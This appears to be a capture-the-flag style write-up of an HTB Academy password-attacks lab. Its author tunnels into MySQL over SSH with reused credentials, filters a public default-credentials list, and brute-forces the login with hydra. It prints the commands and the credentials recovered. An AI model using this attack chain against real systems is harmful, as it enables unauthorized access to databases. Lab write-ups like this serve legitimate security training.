# **HTB Academy: Password Attacks Module – Password Reuse/Default Passwords**

## **Challenge Overview:**
The task is to find MySQL credentials using previously discovered user credentials. Below is the step-by-step approach I followed to solve this challenge.

---

### **Step 1: Establish an SSH Tunnel**

Using SSH, I forwarded the MySQL port (3306) to my local machine:

```bash
ssh -L 4444:localhost:3306 sam@10.129.xx.xxx
```

- **Username:** `sam`
- **Password:** `B@t********`

---

### **Step 2: Download Default Credentials Cheat Sheet**

I fetched a default credentials cheat sheet that includes common MySQL credentials:

```bash
wget https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv
```

---

### **Step 3: Filter for MySQL Credentials**

Using `grep`, I extracted MySQL-specific credentials from the cheat sheet and saved them to a file for further testing:

```bash
cat DefaultCreds-Cheat-Sheet.csv | grep MySql
grep -i 'mysql' DefaultCreds-Cheat-Sheet.csv > cred.list
```

I then manually edited the `cred.list` file to keep the most promising credentials:

```
admin@example.com:admin
root:<blank>
root:root
superdba:admin
```

---

### **Step 4: Brute-Force Login Using Hydra**

To automate the login attempts, I used `hydra` with the credentials file:

```bash
hydra -C cred.list mysql://localhost:4444
```

---

### **Success!**

After a few attempts, Hydra successfully found valid MySQL credentials:

- **Login:** `superdba`
- **Password:** `admin`

```bash
[4444][mysql] host: localhost login: superdba password: admin
1 of 1 target successfully completed, 1 valid password found
```

---

**Happy Hacking!**